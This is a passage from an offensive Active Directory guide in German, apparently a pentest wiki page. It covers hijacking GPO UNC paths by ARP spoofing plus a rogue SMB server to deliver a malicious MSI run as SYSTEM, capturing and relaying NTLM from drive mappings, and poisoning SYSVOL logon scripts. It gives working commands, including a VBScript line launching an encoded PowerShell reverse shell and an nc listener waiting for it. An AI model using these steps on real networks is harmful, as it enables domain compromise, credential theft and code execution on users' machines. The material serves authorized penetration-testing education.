Wenn die verknüpfte GPO ein MSI von einem UNC-Pfad bereitstellt, ruft der Client es beim **Computerstart** ab und installiert es als **`NT AUTHORITY\SYSTEM`**. Indem du den referenzierten Host spoofst und ein bösartiges MSI unter **demselben Share/Pfad/Namen** bereitstellst, kannst du `WriteGPLink` in SYSTEM-Codeausführung verwandeln, **ohne SYSVOL zu ändern**.

Wichtige Einschränkungen:

- **Der Zeitpunkt ist entscheidend**: Der neue Link wird bei der Richtlinienaktualisierung erkannt (häufig nach etwa 90 Minuten), aber **Software Installation** wird normalerweise erst beim **Neustart** ausgelöst.
- Windows Installer erfasst die Bereitstellung üblicherweise anhand des **`ProductCode`** des Pakets. Wenn das Produkt bereits installiert ist, wird die Bereitstellung möglicherweise übersprungen.
- Um eine Ablehnung durch den Installer zu vermeiden, passe das bösartige MSI so an, dass sein **`ProductCode`** und **`PackageCode`** mit dem erwarteten legitimen Paket übereinstimmen.
- Alte `.aas`-Ankündigungsdateien können in `SYSVOL` verbleiben. Prüfe daher, ob die Bereitstellung noch aktiv aussieht, bevor du dich darauf verlässt.

```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```

#### UNC-Hijack von Laufwerkszuordnungen -> NTLM-Capture / WebDAV-Relay

GPP-Laufwerkszuordnungen in `Drives.xml` führen dazu, dass sich Benutzer während der Anmeldung oder beim erneuten Verbinden beim konfigurierten UNC-Pfad authentifizieren. Wenn du den referenzierten Host spoofst, kannst du **NetNTLMv2** abfangen. Wird SMB gezielt zum Fehlschlagen gebracht, versucht Windows es möglicherweise erneut über **WebDAV** und sendet **NTLM über HTTP**. Das ist für Relays zu **LDAP(S)**, **AD CS** oder **SMB** weitaus flexibler.

#### UNC-Hijack von Anmelde-/Startskripten

Dasselbe Muster gilt für UNC-gehostete Skripte, die in `SYSVOL` gefunden werden:

- **Anmeldeskripte** werden normalerweise im Kontext des **Benutzers** ausgeführt.
- **Startskripte** werden normalerweise im Kontext des **Computers / SYSTEM** ausgeführt.

Wenn der Skriptpfad auf einen spoofbaren Hostnamen verweist, leite den UNC-Host um und stelle Ersatzskriptinhalte am erwarteten Speicherort bereit.

## Manipulation von Anmeldeskripten in SYSVOL/NETLOGON

Beschreibbare Pfade unter `\\<dc>\SYSVOL\<domain>\scripts\` oder `\\<dc>\NETLOGON\` ermöglichen die Manipulation von Anmeldeskripten, die bei der Benutzeranmeldung über GPO ausgeführt werden. Das ermöglicht Codeausführung im Sicherheitskontext angemeldeter Benutzer.

### Anmeldeskripte finden
- Untersuche Benutzerattribute auf ein konfiguriertes Anmeldeskript:

```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```

- Durchsuche Domänenfreigaben, um Verknüpfungen oder Verweise auf Skripte aufzuspüren:

```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```

- Analysiere `.lnk`-Dateien, um Ziele aufzulösen, die auf SYSVOL/NETLOGON verweisen (nützlicher DFIR-Trick und hilfreich für Angreifer ohne direkten GPO-Zugriff):

```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```

- BloodHound zeigt das `scriptPath`-Anmeldeattribut des Benutzerobjekts an, sofern vorhanden. Über GPO konfigurierte Anmeldeskripte sind separate Richtlinienverweise; prüfe daher auch die zutreffende GPO.

### Schreibzugriff überprüfen (Share-Auflistungen nicht vertrauen)
Automatisierte Tools zeigen SYSVOL/NETLOGON möglicherweise als schreibgeschützt an, obwohl die NTFS-ACL der konkreten Skriptdatei anders ist. Beginne mit einer schreibgeschützten Prüfung dieser Datei und ihres übergeordneten Verzeichnisses; passende Allow-ACEs bleiben mögliche Kandidaten, da der effektive SMB- und NTFS-Zugriff, Deny-ACEs und das aktuelle Token entscheidend sind:

```powershell
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts\login.vbs' |
  Format-List Owner,AccessToString
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts' |
  Format-List Owner,AccessToString
```

Ein autorisierter Schreibtest sollte sich gezielt auf das Ziel beziehen und reversibel sein; sichere das ursprüngliche Skript und stelle es anschließend wieder her. Überschreibe kein funktionierendes Logon-Skript, nur um den Zugriff zu testen: Ein erfolgreicher Schreibzugriff kann dazu führen, dass der Inhalt beim nächsten Logon eines Benutzers ausgeführt wird.

### Ein VBScript-Logon-Skript für RCE vergiften
Hänge einen Befehl an, der eine PowerShell-Reverse-Shell startet (erstelle sie mit revshells.com), und behalte die ursprüngliche Logik bei, damit die geschäftliche Funktion nicht beeinträchtigt wird:

```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```

Lausche auf deinem Host und warte auf die nächste interaktive Anmeldung:

```bash
rlwrap -cAr nc -lnvp 443
```

Hinweise:
- Die Ausführung erfolgt unter dem Token des protokollierenden Benutzers (nicht SYSTEM). Der GPO-Link (OU, Standort, Domäne) bestimmt den Geltungsbereich, auf den das Skript angewendet wird.
- Stelle nach der Verwendung den ursprünglichen Inhalt und die ursprünglichen Zeitstempel wieder her.


## References

- [1] [Missbrauch von Active Directory ACLs/ACEs](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [2] [Privilegierte Konten und Token-Berechtigungen](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [3] [BloodHound 1.3 – Das ACL-Angriffspfad-Update](https://wald0.com/?p=112)
- [4] [ActiveDirectoryRights-Enum - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [5] [Berechtigungen mit ACLs in Active Directory erweitern](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [6] [Nach Active Directory-Berechtigungen und privilegierten Konten suchen](https://adsecurity.org/?p=3658)
- [7] [ActiveDirectoryAccessRule-Konstruktor - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [8] [BloodyAD – AD-Attribut-/UAC-Operationen unter Linux](https://github.com/CravateRouge/bloodyAD)
- [9] [Samba – net rpc (Gruppenmitgliedschaft)](https://www.samba.org/)
- [10] [HTB Puppy: AD-ACL-Missbrauch, KeePassXC-Argon2-Cracking und DPAPI-Entschlüsselung bis zum DC-Admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [11] [TrustedSec - ARP Around and Find Out: GPO-UNC-Pfade kapern, um Code auszuführen und NTLM-Relaying durchzuführen](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)
- [12] [GPOddity: Active Directory-GPOs durch NTLM-Relaying und mehr ausnutzen](https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more)
- [13] [OU macht Witze? - Petros Koutroumpis](https://labs.withsecure.com/publications/ou-having-a-laugh)
- [14] [OUned.py: Versteckte ACL-Angriffsvektoren in Organisationseinheiten in Active Directory ausnutzen](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory)
- [15] [Legitime Active Directory-Dienste im Netzwerk simulieren: der Fall der GPO-Ausnutzung](https://synacktiv.com/en/publications/simulating-legitimate-active-directory-services-on-the-network-the-case-of-gpo.html)
- [16] [Synacktiv GPOddity](https://github.com/synacktiv/GPOddity)
- [17] [Synacktiv OUned](https://github.com/synacktiv/OUned)
- [18] [HTB: Hercules — OU-Bewegung und Missbrauch geerbter ACLs](https://0xdf.gitlab.io/2026/09/21/htb-hercules.html)
